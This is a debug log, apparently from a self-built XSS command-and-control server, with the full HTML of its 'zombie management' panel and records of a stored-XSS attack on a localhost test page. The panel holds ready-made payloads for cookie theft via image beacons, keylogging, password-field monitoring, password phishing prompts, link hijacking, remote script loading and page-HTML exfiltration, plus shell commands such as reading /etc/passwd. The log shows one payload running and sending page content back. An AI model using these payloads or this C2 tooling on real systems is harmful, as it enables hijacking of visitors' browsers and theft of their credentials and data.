\'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:41:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:01] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:41:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 22:41:05 | INFO     | control_route.py:138 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 22:41:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 22:41:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:05] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 22:41:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:05 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 22:41:05 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:05 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T14:41:05.463Z"},時間: 2025-06-26 22:41:05.470554
2025-06-26 22:41:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0046s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 22:41:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:05] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 22:41:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:41:05 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:41:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0015s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T14:41:05.463Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:41:05.467488</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:41:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:05] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:41:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:10 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:10 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:10 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:10.469Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0063s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:10] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:10 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:10 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:10.483832
2025-06-26 22:41:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0084s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
